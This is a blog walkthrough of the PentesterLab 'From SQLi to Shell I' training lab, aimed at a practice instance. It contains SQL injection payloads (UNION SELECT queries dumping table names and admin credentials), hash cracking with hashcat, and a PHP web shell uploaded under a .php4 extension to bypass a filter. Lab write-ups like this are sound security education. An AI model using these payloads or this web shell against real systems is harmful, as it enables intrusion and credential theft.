---
layout: post
title:  "PentesterLab SQL Injection Labs(Part 2)"
author: "e1ec30"
---

## From SQLi to Shell I

### Intro 
From the name and the introduction we learn that we can guess that the goal is to use sql injection to get shell on the webserver.

If you want to solve this on your own I'll recommend you only read the introduction part of the prompt because it's actually a step-by-step walkthrough

Below are the steps I followed to get shell on the web server and I'll confess I did read all of the prompt before attempting because this is my first time doing something like this. So this is just me doing everything that's there, which means if you want to solve it on your own you shouldn't read past this point either. Now with that out of the way, let's begin:

### Initial Recon
On starting the instance we see what a photoblog website:

![ ](/assets/images/sqlshell01_home.png)

After clicking around a bit we find out that most of the "tabs" are links to /cat.php with the query parameter id except for the "All pictures" tab which links to /all.php and "Admin" which links to /admin/ which redirects to /admin/login.php

![ ](/assets/images/sqlshell01_admin_login.png)


### Exploitation
If you have done the previous sql injection labs you might be thinking this is the injection point but trying out our payloads there doesn't seem to do anything, so we have to look somewhere else for the sql injection

Now if you remember /cat.php has a query parameter called id:


![ ](/assets/images/sqlshell01_cat_id.png)

So let's try to inject in that parameter:

we try: ```/cat.php?id=2 and 1=1```:

![ we get the same results ](/assets/images/sqlshell01_and_payload.png)

to confirm let's try: ```/cat.php?id=2 and 1=0```

![we see no results](/assets/images/sqlshell01_and_payload_n.png)

This means there's a sqli in that parameter

So how do we exploit that and eventually get a shell?

Well we can start by checking how many columns are requested in the original query by adding an ```ORDER BY``` clause, and how this works is in sql we can order our results by a column for example in this query: ```SELECT first_name, last_name from users```, we can order the results by the first name column by adding ```ORDER BY first_name``` to the end of the query but we can also address the columns by number instead of name, which means we can also write ```ORDER BY 1``` instead of ```ORDER BY first_name``` and we'll achieve the same results also if the number is bigger than the number of columns we get an error. So with that knowledge, we can do a quick "binary search":

`id=1 ORDER BY 6`, we get an error:

![ ](/assets/images/sqlshell01_order_err.png)

`id=1 ORDER BY 3`, we get results

`id=1 ORDER BY 4`, we get results

`id=1 ORDER BY 5`, we get an error

this way we know there are 4 columns in the original query.

How is that useful? you might ask, and the answer is because we want to use a `UNION` attack. The `UNION` keyword in SQL is used to 'piggyback' the results of one query into another and one of it's restrictions is that both queries have to have the same number of columns and we want to retrieve data from other tables in the database. The syntax of the `UNION` keyword is something like `SELECT first_name, last_name FROM users UNION SELECT name, description FROM products`

Now with that out of the way, we might try to get some basic information from the database like it's version and the current user.

also by trial and error we find out that the only column that is displayed is column 2

so we put all the information we want there and keep the rest as place holders:

`id=1 UNION SELECT 1,@@version,3,4` gives us the current version:

![ ](/assets/images/sqlshell01_version.png)

from here we can try to list the table names:

`id=1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables`

![ ](/assets/images/sqlshell01_table_name.png)

Hmm, there's a table called users, I wonder what it contains....

we can get the columns in all tables from `information_schema.columns` and with a `WHERE` clause we can restrict it to only the table where are interested in: 
`id=1 UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users'`:

![ ](/assets/images/sqlshell01_columns.png)

Okay so the users table has 3 columns:
1. `id`
2. `login`
3. `password`

The last two are what we are interested in, we can retreive them both even though only one column is displayed by using the `concat` function in SQL:

`id=1 UNION SELECT 1,concat(login,':',password),3,4 from users`:

![ ](/assets/images/sqlshell01_creds.png)

and we get what looks like the admin's credentials. Cool.

But there is one problem, when we try to login with those it still doesn't work.

That's because passwords aren't stored in plaintext in the database, they are passed through a [hash function](https://en.wikipedia.org/wiki/Hash_function), for security reasons.

So how do we convert this hash back to the password? Well hashes are one way functions so we can't really do that but what we _can_ do is [brute force](https://en.wikipedia.org/wiki/Brute-force_attack). We get a list of possible passwords(a dictionary) and hash each of them then compare it to the unknown hash, if they match then it's our password and we can use it to login.

I used [hashcat](https://hashcat.net) to do that and the file 10-million-password-list-top-10000.txt from [SecLists](https://github.com/danielmiessler/SecLists) as my dictionary:

![ ](/assets/images/sqlshell01_hashcat_cmd.png)

It seems we found a match, let's try it...

![ ](/assets/images/sqlshell01_try_creds.png)

...and it logs us in as the admin, SWEET!

![ ](/assets/images/sqlshell01_logged_in.png)

Now we are logged in as the admin, but we still don't have a shell...

After poking around in this new admin interface we find that we can delete and upload pictures

So how does that help us to get a shell?

Well sometimes developers don't correctly restricted the kind of files that can be uploaded to their applications, for example in this case, are we allowed to only upload images? or can we upload anything we want, for example, php files?

Why PHP? well remember we are dealing with a PHP application and so if we can upload a file with a .php extension the server will execute it which means we can run any PHP code we choose So let's try:
```
<?php
    echo system($_GET["cmd"]);
>
```
This will execute whatever we pass in in the query parameter cmd  to the php function `system` which will execute it in the shell and then echo it back so assuming it is on the path http://site.com/shell.php, if we go to http://site.com/shell.php?cmd=ls we will see the result of the ls command in our browser.

But when we try to upload it we see:

![ ](/assets/images/sqlshell01_failed_upload.png)

Hmm so the developers anticipated that, oops.
So what do we do?
Well we can try other extensions that will still be considered php by the server, for example .php3, .php4, .phtml... etc.

and sure enough, it works:

![ ](/assets/images/sqlshell01_upload_works.png)

![ ](/assets/images/sqlshell01_uploaded.png)

Okay but where's our shell?

If we click on our newly uploaded "image":

![ ](/assets/images/sqlshell01_shell_image.png)

It's broken(obviously, because it's a php file and not an image)

but if we try to inspect the element in our browser:

![ ](/assets/images/sqlshell01_inspect_shell.png)

we see that it's at `/admin/uploads/shell.php4` which means if we go to `/admin/uploads/shell.php4?cmd=id`...

![ ](/assets/images/sqlshell01_shell_run.png)

we get the results of the `id` command back, which means our shell worked! Phew!!